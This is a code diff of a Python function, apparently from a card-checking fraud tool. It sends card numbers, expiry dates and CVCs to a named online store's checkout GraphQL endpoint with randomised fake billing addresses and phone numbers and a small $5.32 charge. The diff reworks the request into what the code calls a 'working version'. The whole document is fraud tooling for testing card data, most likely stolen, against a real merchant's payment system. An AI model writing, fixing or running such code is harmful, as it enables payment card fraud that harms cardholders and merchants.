@@ -165,65 +165,6 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
             'x-checkout-web-source-id': attempt_token
         }
         
-        # Step 1: Create Payment Method first
-        create_payment_method_mutation = """
-        mutation CreatePaymentMethod($paymentMethod: PaymentMethodInput!) {
-            paymentMethodCreate(paymentMethod: $paymentMethod) {
-                paymentMethod {
-                    id
-                }
-                userErrors {
-                    field
-                    message
-                }
-            }
-        }
-        """
-        
-        payment_method_variables = {
-            "paymentMethod": {
-                "creditCard": {
-                    "number": n,
-                    "expiryMonth": int(mm),
-                    "expiryYear": int(f"20{yy}" if len(yy) == 2 else yy),
-                    "verificationValue": cvc
-                },
-                "billingAddress": {
-                    "address1": f"{random.randint(100,9999)} {random.choice(['Main St', 'Oak Ave', 'Pine Rd', 'Elm St'])}",
-                    "city": customer["firstName"][:8] + "ville",
-                    "country": "US",
-                    "zip": f"{random.randint(10000,99999)}",
-                    "firstName": customer["firstName"],
-                    "lastName": customer["lastName"],
-                    "province": random.choice(['NY', 'CA', 'TX', 'FL', 'IL']),
-                    "phone": f"1{random.randint(200,999)}{random.randint(5550000,5559999)}"
-                }
-            }
-        }
-        
-        # Create payment method first
-        pm_response = session.post(
-            "https://www.shopmissa.com/checkouts/unstable/graphql?operationName=CreatePaymentMethod",
-            headers=headers,
-            json={"query": create_payment_method_mutation, "variables": payment_method_variables, "operationName": "CreatePaymentMethod"},
-            timeout=30
-        )
-        
-        if pm_response.status_code != 200:
-            return {"status": "error", "message": f"Payment method creation failed: {pm_response.status_code}"}
-        
-        pm_result = pm_response.json()
-        if pm_result.get('data', {}).get('paymentMethodCreate', {}).get('userErrors'):
-            errors = pm_result['data']['paymentMethodCreate']['userErrors']
-            return {"status": "error", "message": f"Payment method errors: {errors}"}
-        
-        # Get the created payment method ID
-        created_payment_method_id = pm_result.get('data', {}).get('paymentMethodCreate', {}).get('paymentMethod', {}).get('id')
-        if not created_payment_method_id:
-            return {"status": "error", "message": "Failed to create payment method"}
-        
-        # Update the payment method ID for the main mutation
-        payment_method_id = created_payment_method_id
         
         # Shop Miss A SubmitForCompletion mutation (simplified, working version)
         submit_mutation = """
@@ -284,7 +225,29 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
                     "totalAmount": {"any": True},
                     "paymentLines": [{
                         "paymentMethod": {
-                            "paymentMethodId": payment_method_id
+                            "redeemablePaymentMethod": {
+                                "amount": {"value": {"amount": "5.32", "currencyCode": "USD"}},
+                                "redemptionSource": {
+                                    "creditCard": {
+                                        "number": n,
+                                        "expiryMonth": int(mm),
+                                        "expiryYear": int(f"20{yy}" if len(yy) == 2 else yy),
+                                        "verificationValue": cvc
+                                    },
+                                    "billingAddress": {
+                                        "streetAddress": {
+                                            "address1": f"{random.randint(100,9999)} {random.choice(['Main St', 'Oak Ave', 'Pine Rd', 'Elm St'])}",
+                                            "city": customer["firstName"][:8] + "ville",
+                                            "countryCode": "US",
+                                            "postalCode": f"{random.randint(10000,99999)}",
+                                            "firstName": customer["firstName"],
+                                            "lastName": customer["lastName"],
+                                            "zoneCode": random.choice(['NY', 'CA', 'TX', 'FL', 'IL']),
+                                            "phone": f"1{random.randint(200,999)}{random.randint(5550000,5559999)}"
+                                        }
+                                    }
+                                }
+                            }
                         },
                         "amount": {"value": {"amount": "5.32", "currencyCode": "USD"}}
                     }]
